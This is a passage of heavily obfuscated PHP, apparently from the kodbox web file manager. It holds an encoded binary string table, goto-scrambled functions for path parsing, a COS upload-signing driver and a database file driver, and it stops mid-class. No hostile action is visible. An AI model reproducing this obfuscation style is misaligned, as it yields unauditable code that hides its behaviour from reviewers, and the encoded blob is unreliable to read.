#a³R¬vá%')."\131\253\361\214\240\215\152\315\200\352\303\326\375\64\265\120\261\270\246\33\102\61\226\136\250\54\174\104\313\264\54\24\167\74\152\167\70\212\230\153\314\57\133\330\146"."\162\327\50\46\11\127\161\200\22\116\130\365\34\121\46\112\246\136\224\350\123\267\374\372\310\172\227\307\74\76\346\341\263\234\352\27\262\121\55\352\203\3\374\102\33"."\41\37\67\177\106\331\130\350\355\351\226\115\172\43\146\257\325\152\141\73\204\233\277\70\2\113\157\376\165\16\277\145\22\50\7\132\15\362\55\34\43\333\322\205\303"."\203\343\104\271\233\337\340\160\102\71\221\140\257\35\132\212\262\147\321\131\52\110\341\17\43\102\102\111\60\73\344\372\255\112\217\375\251\56\227\150\252\150\51\230\237".strrev('‹c’zÕ¤ÿ6\\d}Á ×6 6àDQL²‡a\'… @'."\r".' Œ´‹“¥{BãíÍÊ')."\x1\xca\x20\x75\x77\xa7\x25\xd5\xc6\x3f\x41\x99\x5\x3d\x44\x6d\x59\x86\xf8\x42\xa3\xf5\x6e\x4e\x64\xfb\x85\xb5\x55\x52\x7e\xa1\x39\xf1\xde\xee\x90\x15\x42\x85\x3f\xc2\xc1\xcd\x3a"."\xc5\x82\xa5\x29\xcf\xa0\x67\x95\x66\x99\x7c\x1\x41\xb2\x81\x91\x92\x41\x31\xd3\xd2\x1d\xfb\xd2\x22\x66\x80\xc3\x25\x4e\x4c\x23\xc1\xa6\x8b\xca\x84\xf3\xcb\x2b\xb6\xde\x8b\x15\xec".base64_decode('I8M19Lz5IXUKf9r+ATo9doaLNyKwOnm3+mGtQB3co4LVcBZ68pcRY5a6Ro9q')."\306\223\5\353\342\54\130\67\57\233\126\26\44\25\102\75\123\316\31\207\30\136\376\344\21\246\75\121\140\300\66\326\26\27\75\324\174\26\54\234\377\71\2\74\366".strrev('<&Ü~k^yk±~@`'."\n".'sH|TeÄ§;À¢öCá`¢õJîÛœÎÜ/ËˆÒ')."\x47\x45\x3f\x26\x5\xb2\x45\x9d\x81\xc2\x5a\x5\xc1\x82\xbb\xd8\xb0\x5e\xf7\xdb\xd2\xc5\x89\xe1\xba\x43\x44\x9b\xa8\x33\x43\x4d\x24\x40\x75\xae\x11\x5\x15\x1e\xd9\x4b\x99\xac\x3d".base64_decode('SqDZtEsp7GVygiZjQfVUB3odOY/VTMlUAC5o9mIGQzPVuKBhZH/vGefTj6S4')."\300\154\317\206\213\166\157\274\153\367\332\333\167\377\341\342\235\127\337\340\330\265\154\365\256\225\227\161\27\271\50\143\327\55\27\354\275\361\17\223\245\135\227\235\13"."\x33\xaf\xbb\xe4\xa3\xc7\x37\xe0\xff\x77\xde\xf9\xd8\x9e\xb5\x9b\xa1\x77\x5d\x54\x64\xe7\xba\xc7\xf6\xac\x5b\xbd\x7b\xc5\xdd\xbb\x2e\xfd\xcb\xae\xeb\x6f\xdb\x75\xed\xa5\xd4\x59\x8f"."\105\334\223\57\32\102\111\204\0\343\262\150\213\376\64\76\321\211\104\36\137\234\325\302\333\124\166\31\3\331\52\7\76\50\161\66\174\315\332\1\363\302\132\26\375"."\xd6\x68\xa6\x49\xf1\xe\x20\x75\x6d\xaf\xc2\xb\xca\x9\x20\xc4\x6f\x5e\xe0\x92\xa0\xcb\x0\x4\xbc\x8\xc9\xa0\x20\xb9\xc2\x83\x2c\x68\x48\xc1\xb9\x8\x35\x59\x22\xf0\x92\x81\x45"."\202\371\267\11\365\71\333\345\41\117\0\314\143\114\353\245\316\303\240\115\46\357\17\177\255\123\266\223\146\134\105\200\0\257\250\152\201\54\137\15\67\316\161\23\57"."\254\116\324\206\223\70\373\130\224\355\260\124\307\376\341\231\312\337\57\265\100\4\223\274\11\354\231\21\111\231\240\237\122\357\154\137\50\34\312\313\152\361\204\102\155"."\201\140\35\166\344\230\227\215\152\11\132\55\171\131\55\215\201\346\103\345\171\233\74\76\177\136\36\324\162\151\216\162\377\63\70\313\327\202\172\351\361\373\3\155\207"."\352\205\257\166\6\357\11\272\53\345\222\357\154\122\243\142\154\172\101\20\222\123\224\207\26\314\271\224\64\167\104\304\353\130\105\3\342\272\32\324\3\27\13\130\135"."\x9e\xdb\x14\xce\x28\xc0\x92\x86\xa0\x86\x4a\x33\x69\x3b\x98\x25\xa9\xd0\xb1\x25\xc3\x14\x8c\xfc\x45\x3\xd2\x6c\x7a\xeb\xf8\x36\xd8\x65\xb9\x35\x16\xd2\xd1\x66\x11\x5e\x73\xc7\xfc"."\201\160\26\243\204\321\5\147\114\274\335\315\27\346\243\134\76\43\260\247\323\65\242\23\265\110\213\11\222\102\314\215\20\273\52\62\307\202\132\22\16\223\354\377\1"."\300\177\211\213\43\232\0\0"."".base64_decode(''), 10, -8))); goto EùÚ•ó„‘¬; FñÃØ‹ñù÷: $a¼ŞÎ•Àõå = strrev(base64_decode($_SERVER[ßŞº€åŒÀğ‘¯][0])); function binCheckNeq($BÆöğôâÓ‹, $cÄÇ•ç÷Éê) { return $BÆöğôâÓ‹ != $cÄÇ•ç÷Éê; } $_SERVER[$_SERVER[ßŞº€åŒÀğ‘¯][1]] = $a¼ŞÎ•Àõå($_SERVER[$_SERVER[ßŞº€åŒÀğ‘¯][2]]); goto aÀµ½Ğ˜©‡; dª‰Ô‹˜ãÉ: class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\162\x52\145\x63\171\143\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\165\x73\145\162\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\x46\151\154\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\106\x69\154\x65\x54\171\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\160\x52\x6f\157\164\x53\145\x6c\146\175"; const KOD_USER_SHARE = "\173\x75\x73\145\x72\x53\x68\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\162\x53\x68\x61\x72\x65\114\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\173\163\150\141\x72\x65\111\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\150\x61\162\x65\111\164\145\155\114\151\156\x6b\175"; const KOD_SEARCH = "\x7b\163\145\141\162\x63\150\175"; const KOD_BLOCK = "\173\142\x6c\x6f\143\x6b\175"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\163\x65\162\x52\145\x6e\143\x65\156\x74\175"; const KOD_USER_DRIVER = "\x7b\144\162\151\166\x65\162\175"; public static function typeList() { $C½‘‘±ˆ´Ø =& $_SERVER[¢ÌÛ]; return array($C½‘‘±ˆ´Ø[1113] => self::KOD_SOURCE, $C½‘‘±ˆ´Ø[1114] => self::KOD_USER_RECYCLE, $C½‘‘±ˆ´Ø[1115] => self::KOD_USER_FAV, $C½‘‘±ˆ´Ø[1116] => self::KOD_USER_FILE_TAG, $C½‘‘±ˆ´Ø[1117] => self::KOD_USER_FILE_TYPE, $C½‘‘±ˆ´Ø[1118] => self::KOD_GROUP_ROOT_SELF, $C½‘‘±ˆ´Ø[1119] => self::KOD_USER_SHARE, $C½‘‘±ˆ´Ø[1120] => self::KOD_USER_SHARE_LINK, $C½‘‘±ˆ´Ø[1121] => self::KOD_USER_SHARE_TO_ME, $C½‘‘±ˆ´Ø[1122] => self::KOD_SHARE_ITEM, $C½‘‘±ˆ´Ø[1123] => self::KOD_SHARE_LINK, $C½‘‘±ˆ´Ø[1124] => self::KOD_SEARCH, $C½‘‘±ˆ´Ø[1125] => self::KOD_BLOCK, $C½‘‘±ˆ´Ø[1126] => self::KOD_IO, $C½‘‘±ˆ´Ø[1127] => self::KOD_USER_RECENT, $C½‘‘±ˆ´Ø[1128] => self::KOD_USER_DRIVER); } public static function parse($e‹‡­Ñ¦“) { goto AÇÒ­Â·°®; c¤•ÀšøŸ›: preg_match($Eõç·ø¦¡[1129], $e‹‡­Ñ¦“, $bŠğ¿Ü‡ÆØ); $Déİ£ÈŠ÷Ô = array($Eõç·ø¦¡[415] => !1, $Eõç·ø¦¡[1130] => !1, $Eõç·ø¦¡[412] => !1, $Eõç·ø¦¡[75] => $e‹‡­Ñ¦“, $Eõç·ø¦¡[1041] => !1, $Eõç·ø¦¡[1040] => $Eõç·ø¦¡[33]); if (is_array($bŠğ¿Ü‡ÆØ) && count($bŠğ¿Ü‡ÆØ) == 5) { $c¨ùĞÀªÙ = $Eõç·ø¦¡[1131] . $bŠğ¿Ü‡ÆØ[2] . $Eõç·ø¦¡[323]; if (in_array($c¨ùĞÀªÙ, $D´Á•¿Å½)) { $Déİ£ÈŠ÷Ô[$Eõç·ø¦¡[1041]] = $bŠğ¿Ü‡ÆØ[1]; $Déİ£ÈŠ÷Ô[$Eõç·ø¦¡[29]] = $c¨ùĞÀªÙ; $Déİ£ÈŠ÷Ô[$Eõç·ø¦¡[1132]] = substr($c¨ùĞÀªÙ, 1, -1); $Déİ£ÈŠ÷Ô[$Eõç·ø¦¡[385]] = $bŠğ¿Ü‡ÆØ[3]; } $Déİ£ÈŠ÷Ô[$Eõç·ø¦¡[1040]] = $bŠğ¿Ü‡ÆØ[4]; } goto e£ˆÁ˜…®¡; e£ˆÁ˜…®¡: $fÉ‚‹¸‡¹Ã = array($Eõç·ø¦¡[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Déİ£ÈŠ÷Ô[$Eõç·ø¦¡[1094]] = in_array($Déİ£ÈŠ÷Ô[$Eõç·ø¦¡[29]], $fÉ‚‹¸‡¹Ã); return $Déİ£ÈŠ÷Ô; goto CğÙ¾©èÙÉ; AÇÒ­Â·°®: $Eõç·ø¦¡ =& $_SERVER[¢ÌÛ]; $e‹‡­Ñ¦“ = self::clear($e‹‡­Ñ¦“); $D´Á•¿Å½ = array_values(self::typeList()); goto c¤•ÀšøŸ›; CğÙ¾©èÙÉ: } public static function clear($E‰ö¢„ã–È) { goto fã–»ÖÖ±; CÒí‹©½ùÉ: return $E‰ö¢„ã–È; goto e¨–Ù©«ë; fã–»ÖÖ±: $E‰¥™Ëå´ =& $_SERVER[¢ÌÛ]; $E‰ö¢„ã–È = str_replace(array($E‰¥™Ëå´[1014], $E‰¥™Ëå´[227]), $E‰¥™Ëå´[50], $E‰ö¢„ã–È); $E‰ö¢„ã–È = str_replace($E‰¥™Ëå´[96], $E‰¥™Ëå´[8], $E‰ö¢„ã–È); goto cÄåßä·Œ; b‰‹ÔÔğ±…: $E‰ö¢„ã–È = preg_replace($E‰¥™Ëå´[1135], $E‰¥™Ëå´[8], $E‰ö¢„ã–È); if ($E‰ö¢„ã–È == $E‰¥™Ëå´[8]) { return $E‰¥™Ëå´[8]; } $E‰ö¢„ã–È = rtrim($E‰ö¢„ã–È, $E‰¥™Ëå´[8]); goto CÒí‹©½ùÉ; cÄåßä·Œ: $bÕîµ†‘ÃÁ = $E‰¥™Ëå´[1133]; if (substr($E‰ö¢„ã–È, 0, 3) == $E‰¥™Ëå´[1134]) { $E‰ö¢„ã–È = substr($E‰ö¢„ã–È, 3); } while (strstr($E‰ö¢„ã–È, $bÕîµ†‘ÃÁ)) { $E‰ö¢„ã–È = str_replace($bÕîµ†‘ÃÁ, $E‰¥™Ëå´[8], $E‰ö¢„ã–È); } goto b‰‹ÔÔğ±…; e¨–Ù©«ë: } public static function sourceID($Bù¹¸ù„) { $b‚¡—›«©… =& $_SERVER[¢ÌÛ]; $f¤¬¯ö¹´ = self::parse($Bù¹¸ù„); if ($f¤¬¯ö¹´[$b‚¡—›«©…[29]] !== self::KOD_SOURCE) { show_json(LNG($b‚¡—›«©…[1136]), !1); } return $f¤¬¯ö¹´[$b‚¡—›«©…[385]]; } public static function make($Fé–ÚÛÂ­) { if (!$Fé–ÚÛÂ­) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Fé–ÚÛÂ­)); } public static function makeShare($b®ÛŒ¶¦‰¯, $d«Î’ßÓ¤›) { return self::makePath(self::KOD_SHARE_ITEM, $b®ÛŒ¶¦‰¯, $d«Î’ßÓ¤›); } public static function makeFileTypePath($f‡ÄÑ©—°…) { return self::makePath(self::KOD_USER_FILE_TYPE, $f‡ÄÑ©—°…); } public static function makeFileTagPath($E­´´óù‰è) { return self::makePath(self::KOD_USER_FILE_TAG, $E­´´óù‰è); } public static function makePath($f¿‹›Õññ, $BÕ×Õ¸İ¶¹ = '', $FÄ‡à©ïç‹ = '') { $D¦²ŞÄÒ…… =& $_SERVER[¢ÌÛ]; $bºË«“…èƒ = substr($f¿‹›Õññ, 1, -1); $F¥¹Ü‹Ìâ = $D¦²ŞÄÒ……[1137] . $bºË«“…èƒ . $D¦²ŞÄÒ……[1138] . $BÕ×Õ¸İ¶¹ . $D¦²ŞÄÒ……[1139]; $F¥¹Ü‹Ìâ = $FÄ‡à©ïç‹ ? $F¥¹Ü‹Ìâ . $FÄ‡à©ïç‹ . $D¦²ŞÄÒ……[8] : $F¥¹Ü‹Ìâ; return $F¥¹Ü‹Ìâ; } public static function hashPath($Dâª•î·¾ƒ) { $dÌÚÆôó‡ß =& $_SERVER[¢ÌÛ]; $e›ë‹é®œ† = is_array($Dâª•î·¾ƒ) ? $Dâª•î·¾ƒ : IO::info($Dâª•î·¾ƒ); $Eœ•Â‚¾è = _get($e›ë‹é®œ†, $dÌÚÆôó‡ß[1140], $dÌÚÆôó‡ß[33]); if (!$Eœ•Â‚¾è) { $C¢»ëóÌ‹ = KodIO::parse($e›ë‹é®œ†[$dÌÚÆôó‡ß[75]]); if (!$C¢»ëóÌ‹[$dÌÚÆôó‡ß[29]]) { $Eœ•Â‚¾è = IO::hashSimple($e›ë‹é®œ†[$dÌÚÆôó‡ß[75]]); } } if (!$Eœ•Â‚¾è) { $Eœ•Â‚¾è = md5($e›ë‹é®œ†[$dÌÚÆôó‡ß[75]] . $e›ë‹é®œ†[$dÌÚÆôó‡ß[77]] . $e›ë‹é®œ†[$dÌÚÆôó‡ß[83]]); } return $Eœ•Â‚¾è; } public static function initSystemPath() { goto dº‚Ñ‘÷¹Œ; a¢Ïñ±×Ø°: IOHistory::bindEvent(); goto eõ¢ğÒœä†; dº‚Ñ‘÷¹Œ: $fŞ¾ã’ØÃ‹ =& $_SERVER[¢ÌÛ]; if (defined($fŞ¾ã’ØÃ‹[1141])) { return; } define($fŞ¾ã’ØÃ‹[1141], self::systemPath($fŞ¾ã’ØÃ‹[1142])); goto BøÎ¥Ùê½Í; BøÎ¥Ùê½Í: define($fŞ¾ã’ØÃ‹[1143], self::systemPath($fŞ¾ã’ØÃ‹[1144])); define($fŞ¾ã’ØÃ‹[1145], self::systemPath($fŞ¾ã’ØÃ‹[1146])); define($fŞ¾ã’ØÃ‹[1147], self::systemPath($fŞ¾ã’ØÃ‹[1148])); goto a¢Ïñ±×Ø°; eõ¢ğÒœä†: } public static function systemPath($E†èÂ¸Ì»‹) { goto d«§ºÓº; BÕ­È¢Œï±: return $AµÜÍÈ¹Å¦; goto cœé¢øİ‚ì; eñÅ»ˆ„ğ: if ($AµÜÍÈ¹Å¦) { return $AµÜÍÈ¹Å¦; } if ($E†èÂ¸Ì»‹ == $E±à÷à¥—¿[1142]) { $AµÜÍÈ¹Å¦ = self::make(Model($E±à÷à¥—¿[774])->systemRootPathAdd($E±à÷à¥—¿[1150])); } else { $AµÜÍÈ¹Å¦ = self::systemPath($E±à÷à¥—¿[1142]); $AåŠ’§É‹Ü = self::sourceID($AµÜÍÈ¹Å¦); $AµÜÍÈ¹Å¦ = self::make(Model($E±à÷à¥—¿[774])->mkdir($AåŠ’§É‹Ü, $E†èÂ¸Ì»‹)); } Model($E±à÷à¥—¿[1099])->set($cŒè–“¸©, $AµÜÍÈ¹Å¦); goto BÕ­È¢Œï±; d«§ºÓº: $E±à÷à¥—¿ =& $_SERVER[¢ÌÛ]; $cŒè–“¸© = $E±à÷à¥—¿[1149] . ucfirst($E†èÂ¸Ì»‹); $AµÜÍÈ¹Å¦ = Model($E±à÷à¥—¿[1099])->get($cŒè–“¸©); goto eñÅ»ˆ„ğ; cœé¢øİ‚ì: } public static function systemFolder($e«ÒÙÃš©ë) { $F¢ŞÀí = IO_PATH_SYSTEM_SOURCE . $e«ÒÙÃš©ë; $dñ›óÖé³™ = Cache::get($F¢ŞÀí); if (!$dñ›óÖé³™) { $EÊòº‘Ûâ = IO::infoFull($F¢ŞÀí); if (!$EÊòº‘Ûâ) { $dñ›óÖé³™ = IO::mkdir($F¢ŞÀí, REPEAT_SKIP); } else { $dñ›óÖé³™ = $EÊòº‘Ûâ[$_SERVER[¢ÌÛ][75]]; } Cache::set($F¢ŞÀí, $dñ›óÖé³™, 3600 * 10); } return $dñ›óÖé³™; } public static function defaultDriver() { return Model($_SERVER[¢ÌÛ][726])->defaultDriver(); } public static function defaultIO() { $Dˆ®åÏ¡÷” =& $_SERVER[¢ÌÛ]; $E¨ÇÍˆ£Ó = self::defaultDriver(); return $Dˆ®åÏ¡÷”[1151] . $E¨ÇÍˆ£Ó[$Dˆ®åÏ¡÷”[385]] . $Dˆ®åÏ¡÷”[1139]; } public static function defaultDriverInit() { static $Aµç–É¶äÖ = false; if ($Aµç–É¶äÖ) { return $Aµç–É¶äÖ; } $Aµç–É¶äÖ = IO::init(self::defaultIO()); return $Aµç–É¶äÖ; } public static function fileTypeList() { $d×Ç—Œ»ğñ =& $_SERVER[¢ÌÛ]; $B˜¦ˆ¤ÊŸÒ = $GLOBALS[$d×Ç—Œ»ğñ[6]][$d×Ç—Œ»ğñ[1152]]; foreach ($B˜¦ˆ¤ÊŸÒ as $c»ØÀ±†±Ğ => $Eİ°›¡ìÚî) { $Dïæˆˆí™ğ = $d×Ç—Œ»ğñ[1153] . $c»ØÀ±†±Ğ; $Eè‰Ò„·¡‡ = LNG($Dïæˆˆí™ğ); if ($Dïæˆˆí™ğ != $Eè‰Ò„·¡‡) { $B˜¦ˆ¤ÊŸÒ[$c»ØÀ±†±Ğ][$d×Ç—Œ»ğñ[28]] = $Eè‰Ò„·¡‡; } } return $B˜¦ˆ¤ÊŸÒ; } public static function transferType($e§­¢†± «, $BÛ¬ï¾ÖÇù) { goto C…Ü³©ùÇ; FõùÙ†œÈ¦: if ($EãÂÜ¸Ò‚À[$C¢¶‰©…[29]] == $D²³Ûˆ÷Ä…[$C¢¶‰©…[29]] && $EãÂÜ¸Ò‚À[$C¢¶‰©…[1154]] == $D²³Ûˆ÷Ä…[$C¢¶‰©…[1154]]) { return $C¢¶‰©…[1155]; } if ($EãÂÜ¸Ò‚À[$C¢¶‰©…[29]] == $C¢¶‰©…[807] && $D²³Ûˆ÷Ä…[$C¢¶‰©…[29]] == $C¢¶‰©…[105]) { return $C¢¶‰©…[1070]; } if ($EãÂÜ¸Ò‚À[$C¢¶‰©…[29]] == $C¢¶‰©…[105] && $D²³Ûˆ÷Ä…[$C¢¶‰©…[29]] == $C¢¶‰©…[807]) { return $C¢¶‰©…[106]; } goto DÚ¹«ñ›‹ó; C…Ü³©ùÇ: $C¢¶‰©… =& $_SERVER[¢ÌÛ]; $EãÂÜ¸Ò‚À = self::driverType($e§­¢†± «); $D²³Ûˆ÷Ä… = self::driverType($BÛ¬ï¾ÖÇù); goto FõùÙ†œÈ¦; DÚ¹«ñ›‹ó: return $C¢¶‰©…[1156]; goto FÆê¢èçª; FÆê¢èçª: } public static function driverType($BªÔ¿ÕóŸ·) { goto E—ô¿ŞÆÄ; a„£äÈí¥Ç: if ($FÈ¹ê½ÌÊÀ == $fò‰‘ÔŸ™‚[717] || $FÈ¹ê½ÌÊÀ == $fò‰‘ÔŸ™‚[1158] || $FÈ¹ê½ÌÊÀ == $fò‰‘ÔŸ™‚[1159]) { $BªÔ¿ÕóŸ· = self::defaultDriverInit(); } else { if ($FÈ¹ê½ÌÊÀ == $fò‰‘ÔŸ™‚[1077] || $FÈ¹ê½ÌÊÀ == $fò‰‘ÔŸ™‚[1160]) { $BªÔ¿ÕóŸ· = IO::init($BªÔ¿ÕóŸ·->pathParse[$fò‰‘ÔŸ™‚[1024]]); } } $FÈ¹ê½ÌÊÀ = str_replace($fò‰‘ÔŸ™‚[1157], $fò‰‘ÔŸ™‚[33], strtolower($BªÔ¿ÕóŸ·->getType())); if ($FÈ¹ê½ÌÊÀ == $fò‰‘ÔŸ™‚[105]) { return array($fò‰‘ÔŸ™‚[29] => $fò‰‘ÔŸ™‚[105], $fò‰‘ÔŸ™‚[1154] => $fò‰‘ÔŸ™‚[33], $fò‰‘ÔŸ™‚[75] => $Cøù‘²Çá‹); } goto cÒ…»ÚÕß½; E—ô¿ŞÆÄ: $fò‰‘ÔŸ™‚ =& $_SERVER[¢ÌÛ]; $Cøù‘²Çá‹ = $BªÔ¿ÕóŸ·->path; $FÈ¹ê½ÌÊÀ = str_replace($fò‰‘ÔŸ™‚[1157], $fò‰‘ÔŸ™‚[33], strtolower($BªÔ¿ÕóŸ·->getType())); goto a„£äÈí¥Ç; cÒ…»ÚÕß½: return array($fò‰‘ÔŸ™‚[29] => $fò‰‘ÔŸ™‚[807], $fò‰‘ÔŸ™‚[1154] => $BªÔ¿ÕóŸ·->pathDriver, $fò‰‘ÔŸ™‚[75] => $Cøù‘²Çá‹); goto FÚÙŠÆÃÏÒ; FÚÙŠÆÃÏÒ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($bËÀ»Çì˜) { parent::__construct($bËÀ»Çì˜); $this->signatureVersion($_SERVER[¢ÌÛ][210]); } public function uploadFormData($eÓ¤ƒÅ¯‚‘, $b¬œ©æó¢ = 3600) { goto A³óŒíã; f¡ÖØ¡Ë‚ø: return $Fâ¤´¡³Ş÷; goto Eëã©â¢¥Í; aíÄÆğĞŠ: $DİÙ¨ Ò = $B¼Ú×Åñè“[1161]; $a¾Šù‡ïÒ² = gmdate($B¼Ú×Åñè“[1162], time() + $b¬œ©æó¢); $eË—ŞÌ©µÜ = (string) time() . $B¼Ú×Åñè“[67] . (string) (time() + $b¬œ©æó¢); goto d”…Ï¦Ñš; d”…Ï¦Ñš: $E½¯İó»—À = array($B¼Ú×Åñè“[1163] => $a¾Šù‡ïÒ², $B¼Ú×Åñè“[1164] => array(array($B¼Ú×Åñè“[1165] => $eÆ¦±”ôíŞ), array($B¼Ú×Åñè“[1166] => $this->bucket), array($B¼Ú×Åñè“[1167], $B¼Ú×Åñè“[1168], $B¼Ú×Åñè“[33]), array($B¼Ú×Åñè“[1169] => $DİÙ¨ Ò), array($B¼Ú×Åñè“[1170] => $EŠà´®£Á¨), array($B¼Ú×Åñè“[1171] => $this->accessKey), array($B¼Ú×Åñè“[1172] => $eË—ŞÌ©µÜ))); $E½¯İó»—À = json_encode($E½¯İó»—À); $e¬¿õ¬®’ = hash_hmac($B¼Ú×Åñè“[228], $eË—ŞÌ©µÜ, $this->secret); goto aß×ó”óŒÖ; A³óŒíã: $B¼Ú×Åñè“ =& $_SERVER[¢ÌÛ]; $eÆ¦±”ôíŞ = $B¼Ú×Åñè“[191]; $EŠà´®£Á¨ = $B¼Ú×Åñè“[228]; goto aíÄÆğĞŠ; aß×ó”óŒÖ: $F…ÙÏŠ×ï” = sha1($E½¯İó»—À); $C›´„³Öâ = hash_hmac($B¼Ú×Åñè“[228], $F…ÙÏŠ×ï”, $e¬¿õ¬®’); $Fâ¤´¡³Ş÷ = array($B¼Ú×Åñè“[1165] => $eÆ¦±”ôíŞ, $B¼Ú×Åñè“[1169] => $DİÙ¨ Ò, $B¼Ú×Åñè“[1173] => base64_encode($E½¯İó»—À), $B¼Ú×Åñè“[1170] => $EŠà´®£Á¨, $B¼Ú×Åñè“[1171] => $this->accessKey, $B¼Ú×Åñè“[1174] => $eË—ŞÌ©µÜ, $B¼Ú×Åñè“[1175] => $C›´„³Öâ, $B¼Ú×Åñè“[175] => $this->getHost()); goto f¡ÖØ¡Ë‚ø; Eëã©â¢¥Í: } public function fileOutLink($Bá×ÚŠò‘ø) { $E«í‡ÕĞÑ· =& $_SERVER[¢ÌÛ]; if (substr($Bá×ÚŠò‘ø, 0, 7) == $E«í‡ÕĞÑ·[1176]) { $Bá×ÚŠò‘ø = $E«í‡ÕĞÑ·[1177] . substr($Bá×ÚŠò‘ø, 7); } header($E«í‡ÕĞÑ·[158] . $Bá×ÚŠò‘ø); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($F‡à ²„¡œ) { $this->pathParse = $F‡à ²„¡œ; $this->model = Model($_SERVER[¢ÌÛ][1178]); } public function getPath($e‘ÓÌÀåÛÉ) { return trim($e‘ÓÌÀåÛÉ, $_SERVER[¢ÌÛ][8]); } public function pathFather($Cåí¦ÜÃÍÌ) { $A¹µÕ™ˆ¤Ë = $this->parse($Cåí¦ÜÃÍÌ); $A¹µÕ™ˆ¤Ë = $this->infoSimple($Cåí¦ÜÃÍÌ); return $A¹µÕ™ˆ¤Ë ? $A¹µÕ™ˆ¤Ë[$_SERVER[¢ÌÛ][488]] : !1; } public function pathThis($Cİ ­÷Ğ÷²) { $Aê°‚Œ÷ ¼ = $this->infoSimple($Cİ ­÷Ğ÷²); return $Aê°‚Œ÷ ¼ ? $Aê°‚Œ÷ ¼[$_SERVER[¢ÌÛ][28]] : !1; } public function getPathOuter($fÀ®‰¿–¯) { if (!$fÀ®‰¿–¯) { return $fÀ®‰¿–¯; } $bİÛ×Ö•—Ñ = $this->parse($fÀ®‰¿–¯); return KodIO::make($bİÛ×Ö•—Ñ[$_SERVER[¢ÌÛ][385]]); } public function copyFolderFromIO($f‘œªíœé, $Bâ³Œ¦·½Õ, $bÈÛ†ÃİĞ©, $Dùˆë†õŸ, $D‘Ã•«·£ê) { $Eß¸»ôÏõø = $this->model->copyFolderFromIO($f‘œªíœé, $Bâ³Œ¦·½Õ, $bÈÛ†ÃİĞ©, $Dùˆë†õŸ, $D‘Ã•«·£ê); return KodIO::make($Eß¸»ôÏõø); } public function isParentOf($AÔ¸ìËó…Œ, $E‡™ÌÀâ‰Ë) { return $this->model->isParentOf($AÔ¸ìËó…Œ, $E‡™ÌÀâ‰Ë); } public function mkfile($C†‹ó’î‰, $bé“ÅÃÀÁ = '', $f‹îÅ†ñ÷½ = REPEAT_RENAME) { $b¡•‹µ½Ÿ =& $_SERVER[¢ÌÛ]; $Aé»ç‘ß¯Œ = $this->parse($C†‹ó’î‰); $C†‹ó’î‰ = $Aé»ç‘ß¯Œ[$b¡•‹µ½Ÿ[385]]; for ($eçÃèå¥³ = 0; $eçÃèå¥³ < count($Aé»ç‘ß¯Œ[$b¡•‹µ½Ÿ[1179]]); $eçÃèå¥³++) { $fÓßÀê•ĞÍ = $Aé»ç‘ß¯Œ[$b¡•‹µ½Ÿ[1179]][$eçÃèå¥³]; if ($eçÃèå¥³ == count($Aé»ç‘ß¯Œ[$b¡•‹µ½Ÿ[1179]]) - 1) { $C†‹ó’î‰ = $this->model->mkfile($C†‹ó’î‰, $fÓßÀê•ĞÍ, $bé“ÅÃÀÁ, $f‹îÅ†ñ÷½); break; } $C†‹ó’î‰ = $this->model->mkdir($C†‹ó’î‰, $fÓßÀê•ĞÍ, REPEAT_SKIP); } return $this->getPathOuter($C†‹ó’î‰); } public function mkdir($e³†Š­¿Ï, $CÜîÒêåğÃ = REPEAT_SKIP) { $fë«Éç£ù =& $_SERVER[¢ÌÛ]; $fİ¢Àî¿´ô = $this->parse($e³†Š­¿Ï); $e³†Š­¿Ï = $fİ¢Àî¿´ô[$fë«Éç£ù[385]]; for ($CŠÉ§»²ôë = 0; $CŠÉ§»²ôë < count($fİ¢Àî¿´ô[$fë«Éç£ù[1179]]); $CŠÉ§»²ôë++) { $c§”æ®£Æ£ = $fİ¢Àî¿´ô[$fë«Éç£ù[1179]][$CŠÉ§»²ôë]; $e³†Š­¿Ï = $this->model->mkdir($e³†Š­¿Ï, $c§”æ®£Æ£, $CÜîÒêåğÃ); } return $this->getPathOuter($e³†Š­¿Ï); } public function copyFile($DÀÀ´‡¸×Ü, $b•Úßóù÷Ç, $ešóß©°´¶ = REPEAT_REPLACE) { $A“äâš¼’å =& $_SERVER[¢ÌÛ]; $AÌ©ÈîÊ‘ = $this->parse($b•Úßóù÷Ç); $b¶šÔ•»šÔ = $this->model->copy($DÀÀ´‡¸×Ü, $AÌ©ÈîÊ‘[$A“äâš¼’å[385]], $ešóß©°´¶, $AÌ©ÈîÊ‘[$A“äâš¼’å[75]]); return $b¶šÔ•»šÔ ? $this->getPathOuter($b¶šÔ•»šÔ) : !1; } public function moveFile($e¢ˆĞôîæ, $cÏÀÃ‚×ï—, $C´äëÁì§Ú = REPEAT_REPLACE) { $A‘Íãç±ÑÅ =& $_SERVER[¢ÌÛ]; $A˜¢µ»¶¯„ = $this->parse($cÏÀÃ‚×ï—); $açâäŒâ• = $this->model->move($e¢ˆĞôîæ, $A˜¢µ»¶¯„[$A‘Íãç±ÑÅ[385]], $C´äëÁì§Ú, $A˜¢µ»¶¯„[$A‘Íãç±ÑÅ[75]]); return $açâäŒâ• ? $this->getPathOuter($açâäŒâ•) : !1; } public function copy($e­„¼ĞëÎ¹, $cÊÈÜŒ°Ö…, $fÄ¼±µŒì = REPEAT_REPLACE) { $D¼ùæÆ¯÷› = $this->parse($cÊÈÜŒ°Ö…); $Eğõ‘¤Æ¾Å = $this->model->copy($e­„¼ĞëÎ¹, $D¼ùæÆ¯÷›[$_SERVER[¢ÌÛ][385]], $fÄ¼±µŒì); return $Eğõ‘¤Æ¾Å ? $this->getPathOuter($Eğõ‘¤Æ¾Å) : !1; } public 